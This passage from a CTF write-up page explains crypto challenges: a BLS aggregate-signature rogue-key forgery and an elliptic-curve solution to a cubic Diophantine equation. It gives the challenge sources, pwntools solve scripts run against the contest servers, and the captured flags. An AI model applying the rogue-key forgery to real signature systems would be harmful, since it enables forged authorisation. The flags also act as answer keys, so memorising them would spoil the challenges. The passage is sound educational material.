    elif inp == 3:
        try:
            msg = str(input("Enter public key x value separated by commas\\n> ")).split(", ")
            coeffs = [Fp(int(i)) for i in msg]
            new_x = sum([j*a**i for i,j in enumerate(coeffs)])
            msg = str(input("Enter public key y value separated by commas\\n> ")).split(", ")
            coeffs = [Fp(int(i)) for i in msg]
            new_y = sum([j*a**i for i,j in enumerate(coeffs)])
            pk_C = E2(new_x, new_y)
            PK[-1] = pk_C
        except:
            print("Error, try again.")
    elif inp == 4:
        print("[Alice] Alright, its all up to you now. Give it the pointer of our shared signatures!")
        ptr = int(input("[VAULT] Enter sig id\\n> "))
        msg, sigs = SIGS[ptr][0], SIGS[ptr][1:]
        if not VerifyAggregate(PK, msg, sigs):
            print("[VAULT] UNAUTHORISED SIGNATURE.")
            print("[Bob] NOOO! YOU THREW!!! :<")
            break
        if msg == b'We\\'ll share the flag equally among ourselves':
            print("[Alice] Yay! Good job guys!!!")
            print("[Bob] You did it!!! poggers")
            ur_flag = FLAG[:len(FLAG)//3]
            bob_flag = FLAG[len(FLAG)//3:2*len(FLAG)//3]
            alice_flag = FLAG[2*len(FLAG)//3:]
            print("[VAULT] ur_flag =", ur_flag)
            break
        elif msg == b'We\\'ll give the flag entirely to Charlie':
            print("[VAULT] ur_flag =", FLAG)
            print("[Alice] wait, i got nothing?!?!")
            print("[Bob] what the... Charlie you SNAKEEEEEEEEE >:((((((")
            break
        else:
            print("[VAULT] Message unidentified")
            print("[Alice] ???")
            break
    else:
        break`}]}></CodeBlock>
                <br></br>
                <p>This source code is decently long, but the challenge basically implements the BLS aggregate signature scheme. We have our secret key, and public key, which is used in the aggregation. We also have all public keys of the group. Our goal is to forge a signature for the message "We'll give the flag entirely to Charlie".</p>
                <br></br>
                <p>We have access to a few oracles. We have a signing oracle with our secret key for the BLS (non-aggregate) signature scheme, a signing oracle for the entire group (but only for a specific message, not the one we want), a way to change our public key, and the signature verification.</p>
                <br></br>
                <h3>The solution</h3>
                <p>Notice this part of the code that allows us to change our public key.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':90,'code':`            msg = str(input("Enter public key x value separated by commas\\n> ")).split(", ")
            coeffs = [Fp(int(i)) for i in msg]
            new_x = sum([j*a**i for i,j in enumerate(coeffs)])
            msg = str(input("Enter public key y value separated by commas\\n> ")).split(", ")
            coeffs = [Fp(int(i)) for i in msg]
            new_y = sum([j*a**i for i,j in enumerate(coeffs)])
            pk_C = E2(new_x, new_y)
            PK[-1] = pk_C`}]}></CodeBlock>
                <br></br>
                <p>We can submit any point of the curve, and this public key is the one that gets used for verification. Now let's look at the key verification equation. It checks the following:</p>
                <BlockMath math="e(sum(\Sigma),\phi(G2))=e(H(m),\phi(sum(PK))" />
                <p>We have the value of PK, as the BLS aggregate signature scheme is an asymmetric signature scheme, meaning the public keys are given to everyone to allow them to verify signatures. This means that we can forge <InlineMath math="sum(PK)"/> by submitting</p>
                <BlockMath math="PK_C:=sum(PK)_{target}-PK_A-PK_B" />
                <p>Additionally, if <InlineMath math="len(\Sigma) = len(PK) = 1"/>, the BLS aggregate signature scheme turns into the BLS signature scheme, so the signing and verification will work the same way.</p>
                <p>With this, we realise that we can actually verify a signature that we signed with our own secret key using the BLS signature scheme, by setting <InlineMath math="sum(PK)"/> to the public key that corresponds to the secret key that we used to sign our message.</p>
                <p>This is because <InlineMath math="sum(PK)"/> gets abstracted out into a singular public key, and the verification check becomes that of the BLS (non-aggregate) signature scheme.</p>
                <br></br>
                <p>Note that the server only gives us the x-values of the public keys, so we need to send our solve multiple times until we have guessed the correct y-values. Otherwise, the signature will not verify.</p>
                <br></br>
                <p>Below is my full solvescript.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.sage','language':'py','startingLineNumber':1,'code':`#!sage
import time
import os
from pwn import remote, process, context
from hashlib import sha256
import itertools
context.timeout = None
# proof.all(False)

# ===========================================================================================================
# Set up might take a while on the ncat fyi. Be Patient! Sound a ticket if nothing appears after 2-3 minutes.
# ===========================================================================================================

p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
r = 0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001

# https://ask.sagemath.org/question/74403/points-must-be-on-same-curve-ate_pairing-bls12-381/
Fp = GF(p)
F12 = GF(p**12, name='a'); a = F12.gens()[0]
RF = PolynomialRing(F12, name='T'); T = RF.gens()[0]
j = (T**2 + 1).roots(ring=RF, multiplicities=0)[0]

E0 = EllipticCurve(Fp, [0, 4])
E1 = EllipticCurve(F12, [0, 4])
E2 = EllipticCurve(F12, [0, 4*(j+1)])
phi = E2.isomorphism_to(E1)             # onoes this is an isogeny

x1 = 0x17f1d3a73197d7942695638c4fa9ac0fc3688c4f9774b905a14e3a3f171bac586c55e83ff97a1aeffb3af00adb22c6bb
y1 = 0x08b3f481e3aaa0f1a09e30ed741d8ae4fcf5e095d5d00af600db18cb2c04b3edd03cc744a2888ae40caa232946c5e7e1
G1 = E1(x1, y1)

x2 = ( 0x024AA2B2F08F0A91260805272DC51051C6E47AD4FA403B02B4510B647AE3D1770BAC0326A805BBEFD48056C8C121BDB8
       + 0x13E02B6052719F607DACD3A088274F65596BD0D09920B61AB5DA61BBDC7F5049334CF11213945D57E5AC7D055D042B7E * j )
y2 = ( 0x0CE5D527727D6E118CC9CDC6DA2E351AADFD9BAA8CBDD3A76D429A695160D12C923AC9CC3BACA289E193548608B82801
       + 0x0606C4A02EA734CC32ACD2B02BC28B99CB3E287E85A763AF267492AB572E99AB3F370D275CEC1DA1AAA9075FF05F79BE * j )
G2 = E2(x2, y2)

def H(m):
    h = int(sha256(m).hexdigest(), 16) % r
    return h * G1

while True:
    # rem = process(['sage','baconlettucesalami.py']) #, level='debug')
    rem = remote('crypto-baconlettucesalami.chals.blahaj.sg', 30044)
    
    rem.recvuntil(b'My public key is ')
    line = eval(rem.recvline().rstrip().decode())
    x_A  = sum([j*a**i for i,j in enumerate(line)])
    rem.recvuntil(b'oo ok, mine\'s ')
    line = eval(rem.recvline().rstrip().decode())
    x_B = sum([j*a**i for i,j in enumerate(line)])
    rem.recvuntil(b'[You] ')
    line = eval(rem.recvline().rstrip().decode())
    x_C = sum([j*a**i for i,j in enumerate(line)])

    p_A, p_B, p_C = [E2.lift_x(i) for i in [x_A, x_B, x_C]]

    rem.sendline(b'1')
    rem.sendline(b'We\'ll give the flag entirely to Charlie')

    p_C_ = p_C - p_A - p_B
    msg = str(p_C_).encode()
    rem.sendline(b'2')
    rem.recvuntil(b'[SERVER] Alice signature: ')
    x_σA = Fp(eval(rem.recvline().rstrip().decode())[0])
    rem.recvuntil(b'[SERVER] Bob signature: ')
    x_σB = Fp(eval(rem.recvline().rstrip().decode())[0])
    rem.recvuntil(b'[SERVER] Your signature: ')
    x_σC = Fp(eval(rem.recvline().rstrip().decode())[0])
    s_A, s_B, s_C = [E1.lift_x(i) for i in [x_σA, x_σB, x_σC]]

    rem.recvuntil(b'>')
    rem.sendline(b'3')
    rem.recvline()
    rem.recvuntil(b'>')
    rem.sendline(str(p_C_.x().list())[1:-1].encode())
    rem.sendline(str(p_C_.y().list())[1:-1].encode())

    rem.sendline(b'4')
    rem.sendline(b'0')
    rem.recvuntil(b'[VAULT]')
    rem.recvuntil(b'[VAULT]')
    flag = rem.recvline()
    print(flag)
    if flag != b' UNAUTHORISED SIGNATURE.\\n':
        break
    rem.close()`}]}></CodeBlock>
                <p>Success!</p>
                <br></br>
                <Terminal text={`[+] Opening connection to crypto-baconlettucesalami.chals.blahaj.sg on port 30044: Done
b' UNAUTHORISED SIGNATURE.\\n'
[*] Closed connection to crypto-baconlettucesalami.chals.blahaj.sg port 30044
[+] Opening connection to crypto-baconlettucesalami.chals.blahaj.sg on port 30044: Done
b' UNAUTHORISED SIGNATURE.\\n'
[*] Closed connection to crypto-baconlettucesalami.chals.blahaj.sg port 30044
...
[+] Opening connection to crypto-baconlettucesalami.chals.blahaj.sg on port 30044: Done
b' ur_flag = blahaj{sandwich-f0rgery}\\n'
[*] Closed connection to crypto-baconlettucesalami.chals.blahaj.sg port 30044`}></Terminal>
                <br></br>
                <h3>OSINT</h3>
                <p>In the foreword, I stated that my solve was funny. While I did <i>technically</i> solve this challenge with the intended method, my solution was definitely funny.</p>
                <br></br>
                <p>While skimming through writeups before the CTF, I came across the challenge author (Warri)'s writeups for MaltaCTF 2025. There was this challenge he set, called <i>boshis-lecret-sreasure</i> (link to writeup <a href='https://github.com/Warriii/CTF-Writeups/blob/main/malta25/finals/crypto_boshis_lecret_sreasure.md'>here</a>). I think you can see where this is going.</p>
                <br></br>
                <p>As it turns out, this challenge is an easier version of boshis-lecret-sreasure. So, all I needed to do was to read the writeup to understand what was going on (which I already did prior), copy the solvescript, and remove the irrelevant parts. This was confirmed by the author to be an intended solve as well.</p>
                <br></br>
                <img src={blsOsint} style={{width: 'max(35vh,40vw)'}}></img>
                <br></br>
                <br></br>
                <p>I believe I was the only participant to solve the challenge this way. Although I do wish I could've solved the challenge myself, which I definitely would have succeeded in. On the plus side, I earned more time to do the misc challenges (I had fully cleared crypto at this point).</p>
                <br></br>






                
                <h2 id='cats-revenge'>cats revenge</h2>
                <p><i>looks like blahajctf attracted too much of the top 0.01% of cryptoers, so we had to make it harder :(</i></p>
                <img style={{width: '30vw'}} src={catsRevenge}></img>
                <p>Author: azazo</p>
                <br></br>
                <h3>Foreword</h3>
                <p><a href='https://youtu.be/Zr27VtxOQYQ?si=JhCij3r0_KDcN6KP' target='_blank'>https://youtu.be/Zr27VtxOQYQ?si=JhCij3r0_KDcN6KP</a></p>
                <br></br>
                <p>This was a challenge in the finals and it was, in my opinion, the second hardest crypto challenge of the CTF (behind roblox). I will be taking a look at the underlying math behind the solution.</p>
                <br></br>
                <h3>The Challenge</h3>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':1,'code':`import random
from math import gcd
from secrets import vals

p = 2**127-1

for i in range(5):
    print(f"[ {i+1} / 5 ]")
    s = random.choice(vals)
    print(f"🐱 = {s}")
    try:
        a = int(input("😾 = "))
        b = int(input("😿 = "))
        c = int(input("🙀 = "))
    except EOFError:
        exit(0)
    if not all(abs(i) > p for i in [a, b, c]):
        print("😿😿😿")
        break
    if gcd(a, b) != 1 or gcd(b, c) != 1 or gcd(c, a) != 1:
        print("😿😿😿")
        break
    numer = a**3 + 3*a**2*b + 2*a*b**2 + b**3 + 2*a**2*c + 6*a*b*c + 3*b**2*c + 3*a*c**2 + 2*b*c**2 + c**3
    denom = a**2*b + a*b**2 + a**2*c + 2*a*b*c + b**2*c + a*c**2 + b*c**2
    if numer - s*denom:
        print("😿😿😿")
        break
    print("😸😸😸\\n")
else:
    print("😽😽😽")
    print("blahaj{REDACTED}")`}]}></CodeBlock>
                <br></br>
                <p>We are given 5 instances of the following equation (with <InlineMath math='s'/> randomly selected from a list and known) and we are tasked to find one solution each:</p>
                <BlockMath math="\frac{a+b}{b+c}+\frac{b+c}{c+a}+\frac{c+a}{a+b}=s, \qquad |a|,|b|,|c| > 2^{127}-1,\quad a,b,c \in \mathbb{Z}" />
                <p>This equation has a name, which is a degree-3 Diophantine equation. Quoted from Wikipedia, "A Diophantine equation is a polynomial equation with integer coefficients, for which only integer solutions are of interest".</p>
                <br></br>
                <p>In the original challenge (i.e. cats), the check in line 20 was not present, which meant that values that satisfied the <code className='code'>numer-s*denom == 0</code> check in the code but not the original equation could be submitted. This made for a cheese by sending <InlineMath math="(x, -x, x)"/> as solutions for any arbitrary value of <InlineMath math="x"/>.</p>
                <br></br>
                <h3>Simplification</h3>
                <p>We notice that the numerators and denominators of the expression only consists of the same 3 terms: <InlineMath math="a+b"/>, <InlineMath math="b+c"/>, <InlineMath math="c+a"/>. Hence, we can substitute as such:</p>
                <BlockMath math="x=a+b\\y=b+c\\z=c+a"/>
                <p>Checking back, since <InlineMath math="x"/>, <InlineMath math="y"/> and <InlineMath math="z"/> are known, this is an exactly determined system of three unknowns and three equations, meaning there exists exactly one solution. This means that we are able to recover unique values of <InlineMath math="a"/>, <InlineMath math="b"/> and <InlineMath math="c"/> from <InlineMath math="x"/>, <InlineMath math="y"/> and <InlineMath math="z"/>, using simultaneous equations.</p>
                <br></br>
                <h3>Cubic and Elliptic Curves</h3>
                <p>I'll start with the theory first. Any homogenous trivariate cubic equation defines a cubic curve in the projective plane, expressed in projective coordinates. Furthermore, any smooth cubic curve in the projective plane with at least one rational point is isomorphic to an elliptic curve via a change of variables (i.e. substitution).</p>
                <p>Note that in this case, an isomorphism does not mean a group isomorphism, but instead an invertible morphism between algebraic curves.</p>
                <br></br>
                <p>Now let's check whether our equation fits the criteria to be isomorphic to an elliptic curve. None of this is required to solve the challenge, as one can just handwave away all the criteria by simply testing the blackbox sage function. Hence, feel free to skip <HashLink to='#cats-revenge-solving'>here</HashLink> to find the solution. Let's manipulate the equation we have:</p>
                <BlockMath math="\begin{align*}
                \frac{x}{y}+\frac{y}{z}+\frac{z}{x}&=s\\
                \frac{x}{y}+\frac{y}{z}+\frac{z}{x}-s&=0\\
                x^2z+y^2x+z^2y-sxyz&=0\\
                \end{align*}"/>
                <p>The last equation is the one we will be using to define the curve. It is evidently both homogenous and cubic.</p>
                <br></br>
                <p>Next, there is a rational point <InlineMath math="(0, 1, 0)"/>. Note that although this is not a solution to the original equation, we are looking at the curve here, so it is fine. The purpose of this point is to get sent by the isomorphism to the point at infinity on the elliptic curve.</p>
                <br></br>
                <p>Now, let's ensure that the curve is nonsingular. A curve is singular if and only if it has singular point(s). We can find the singular points, which are the points where all three partial derivatives of the curve are equal to zero. The partial derivatives are as such.</p>
                <BlockMath math="\begin{align*}
                f(x,y,z) &= x^2z+y^2x+z^2y-sxyz\\
                \frac{\delta f}{\delta x} &= 2xz+y^2+z^2y-syz\\
                \frac{\delta f}{\delta y} &= x^2z+2yx+z^2-sxz\\
                \frac{\delta f}{\delta z} &= x^2+y^2x+2zy-sxy\\
                \end{align*}"/>
                <p>The singular point(s) on the curve are defined by the common roots of all four polynomials above. Because s is a constant and is sampled from a list, this system is overdetermined, and so the probability of there being a rational root is extremely tiny. Hence, there is an extremely high probability that the curve is smooth.</p>
                <br></br>
                <p id='cats-revenge-solving'>Now that we've established that our cubic is isomorphic to an elliptic curve, we need to find the isomorphism. Since we're in the big 26 (or big 25 during the CTF), SageMath has a blackbox function for literally everything, which, in this case, is <code className='code'>EllipticCurve_from_cubic(F, P)</code>, where <code className='code'>F</code> is our cubic and <code className='code'>P</code> is the rational point that gets sent to infinity. This function returns the isomorphism from our cubic from our elliptic curve. Getting its inverse is just as easy as SageMath has it built in with <code className='code'>.inverse()</code></p>
                <br></br>
                <h3>Finding a small solution</h3>
                <p>There are many solutions to this equation, some small and some large. Hence, our initial goal is to first find a small solution.</p>
                <br></br>
                <p>Apparently, the smallest solution lies within the region where it is computationally feasible to brute force, which another participant did. However, I decided to find the generator of the elliptic curve, as there are already algorithms that are efficient enough for our use. This gives a rational solution. If we look back at the original equation,</p>
                <BlockMath math="\frac{x}{y}+\frac{y}{z}+\frac{z}{x}=s"/>
                <p>If <InlineMath math="(x, y, z)"/> is a solution, <InlineMath math="(kx, ky, kz)"/> is also a solution for some nonzero value of <InlineMath math="k"/>. Hence, we can normalise the denominators of the solution after we pass the point through the isomorphism.</p>
                <br></br>
                <h3>Making our solution larger</h3>
                <p>This is where the isomorphism to the elliptic curve is useful. At this point, we have a rational point on the elliptic curve that is not the point at infinity. Let's take a look at the addition formula for two points <InlineMath math="P_1,P_2"/> on elliptic curves.</p>
                <BlockMath math={String.raw`
                \text{Let } P_1 = (X_1:Y_1:Z_1), \; P_2 = (X_2:Y_2:Z_2)
                \\[1em]
                U_1 = Y_1 Z_2, \quad U_2 = Y_2 Z_1
                \\
                V_1 = X_1 Z_2, \quad V_2 = X_2 Z_1
                \\
                U = U_2 - U_1, \quad V = V_2 - V_1
                \\[1em]
                X_3 = - U^2 Z_1 Z_2 + V^3 + 2 V^2 V_1 + a_1 V U Z_1 Z_2 + a_2 V^2 Z_1 Z_2
                \\
                Y_3 = - (U + a_1 V) X_3 + V^2 U_1 - a_3 V Z_1 Z_2 - a_4 V Z_1 Z_2
                \\
                Z_3 = V^3 Z_1 Z_2
                \\[0.5em]
                \text{Then } P_3 = P_1 + P_2 = (X_3 : Y_3 : Z_3)
                `} />
                <p>It is important to note that SageMath divides throughout by <InlineMath math="Z"/> when defining points, i.e. normalising <InlineMath math="Z"/>. This still defines the same point as points on the elliptic curve are defined by having the same affine coordinates i.e. <InlineMath math="(\frac{X}{Z},\frac{Y}{Z})"/>.</p>
                <br></br>
                <p>This formula looks quite long, but the key part that we need to take note of is that there are exponents in the formula. This means that for a rational number <InlineMath math="\frac{a}{b}"/>, both <InlineMath math="a"/> and <InlineMath math="b"/> will increase with point addition. So, when we normalise the denominators, we get larger values that are also coprime!</p>
                <br></br>
                <p>We can get large values by multiplying our point by say, 15, which I found to be large enough after testing. Afterwards, we can just pass our point through the isomorphism, which does not change the magnitude much as it is just a change of variables, and normalise the denominators. Then, we can derive <InlineMath math="a"/>, <InlineMath math="b"/> and <InlineMath math="c"/> from <InlineMath math="x"/>, <InlineMath math="y"/> and <InlineMath math="z"/> and submit them!</p>
                <br></br>
                <p>Below is my solvescript:</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.sage','language':'python','startingLineNumber':1,'code':`#!sage
from pwn import remote, process
from math import lcm

p = 2**127-1

def solve(s):
    P = QQ["x, y, z"]
    x, y, z = P.gens()

    eq = x / y + y / z + z / x - s
    f = EllipticCurve_from_cubic(eq.numerator(), [0, 1, 0])
    fi = f.inverse()

    E = f.codomain()

    G = E.gen(0)
    G *= 15
    G = fi(G)

    x,y,z = G

    # a + b = x
    # b + c = y
    # a + c = z

    # b - c = x - z
    bMc = x-z
    b = (bMc+y)/2
    a = x-b
    c = z-a
    assert a+b==x and b+c == y and a+c == z

    scalar = lcm(a.denom(),b.denom(),c.denom())
    
    a *= scalar
    b *= scalar
    c *= scalar

    return a,b,c

io = remote('crypto-cats-revenge.finals.blahaj.sg',28032)
# io = process(['python3','catsrevenge.py'])

for i in range(5):
    io.recvuntil(b' = ')
    s = int(io.recvline().decode().strip())
    a,b,c = solve(s)

    io.sendlineafter(b' = ',str(a).encode())
    io.sendlineafter(b' = ',str(b).encode())
    io.sendlineafter(b' = ',str(c).encode())

    numer = a**3 + 3*a**2*b + 2*a*b**2 + b**3 + 2*a**2*c + 6*a*b*c + 3*b**2*c + 3*a*c**2 + 2*b*c**2 + c**3
    denom = a**2*b + a*b**2 + a**2*c + 2*a*b*c + b**2*c + a*c**2 + b*c**2
    assert denom != 0
    assert numer-s*denom == 0

    print('Round {} cleared'.format(i+1))

io.recvline()
io.recvline()
io.recvline()
print(io.recvline().strip().decode())`}]}></CodeBlock>
                <p>And here's the flag!</p>
                <br></br>
                <Terminal text={`[+] Opening connection to crypto-cats-revenge.finals.blahaj.sg on port 28032: Done
Round 1 cleared
Round 2 cleared
Round 3 cleared
Round 4 cleared
Round 5 cleared
blahaj{K0ngkK0nG_30r30bU7-3uN_h4n'g4ng_w1-r0_G0y4NG'1G4_g30R30d4n1MN1D4__sorry_for_the_unintended!}
[*] Closed connection to crypto-cats-revenge.finals.blahaj.sg port 28032`}></Terminal>
                <br></br>













                <h2 id='roblox'>roblox</h2>
                <p><i>i saw yall play roblox during training. Might as well make a roBLOX cipher!</i></p>
                <p><i><a href='https://www.youtube.com/watch?v=7SK4-52txhA' target='_blank'>https://www.youtube.com/watch?v=7SK4-52txhA</a> (Recommended to play while solving)</i></p>
                <p>Author: Warri</p>
                <br></br>
                <h3>Foreword</h3>
                <p>Ahh, the good old days when we were kids, playing roblox without a worry... This was the hardest crypto challenge in the entire CTF, and is the only one I did not solve. I learnt loads from this challenge, and I will be detailing my (up)solve path. It is pretty much the intended, except that the author used Z3, while I did not use Z3 in order to gain a better understanding of the methods to solve the equations. Without further ado, let's get into it.</p>
                <br></br>
                <h3>The challenge</h3>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':1,'code':`import os
from typing import List

FLAG = 'blahaj{REDACTED}'
banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⢿⣿⠿⣿⣷⣆⣀⡦⠤⣤⣤⣴⣶⣶⣶⣦⣤⣤⣴⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣴⣶⣿⣿⡄⢾⣿⣿⣿⣿⣷⣯⣙⣻⢶⣬⣟⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣛⣛⣻⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠉⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⠀⡐⠠⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋⢆⢿⣿⣿⣿⣿⣿⣿⣀⠄⠂⡁⠠⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⢄⢹⣿⣿⣿⣿⣿⣿⣿⡄⠠⢀⠠⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢿⣿⣿⣿⣿⣿⣑⠊⢼⣿⣿⣿⣿⣿⣿⣿⡇⠁⠂⠄⢀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠈⢿⣿⣿⣿⣿⢆⠩⠸⠿⠿⠿⠿⠿⠛⠟⠁⢀⠁⠌⠀⠄⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠎⡰⠡⢌⡐⠠⠄⠠⠀⠤⠐⠠⠈⠀⠌⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠸⣿⣿⡣⢐⢃⠢⠐⠡⠈⠄⠡⡐⠈⠄⠁⠌⠀⢄⢸⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⣿⣿⡱⢈⠄⢂⠉⠄⡁⢈⠠⢀⠂⠈⠀⠂⠁⠈⠈⠛⠿⡟⠉⠁⠀⣼⣿⣿⣿⣿⣿⣿⠿⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⠿⡟⡄⣾⡄⠨⠐⠠⠣⠐⢠⢂⣠⣥⠀⠆⠁⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣟⠉⠀⢸⡿⠟⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠸⢻⣿⡤⠁⠂⠁⠀⠄⣬⣿⡿⠀⠀⠠⠀⠀⠀⠐⠀⠀⠈⠙⠻⠿⣿⠉⠀⠀⠀⠀⠀⠀⠄⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠆⠀⠀⣿⠡⢉⠻⣿⣦⡀⠀⢐⣼⣿⠟⠀⠀⠠⠀⠀⠀⢀⠀⠀⠄⠀⠄⠀⢀⣺⠀⠀⠀⠀⡰⠀⠀⠇⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠡⠂⡀⠉⠿⣷⣾⣿⠟⠁⠀⢀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⢀⣤⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
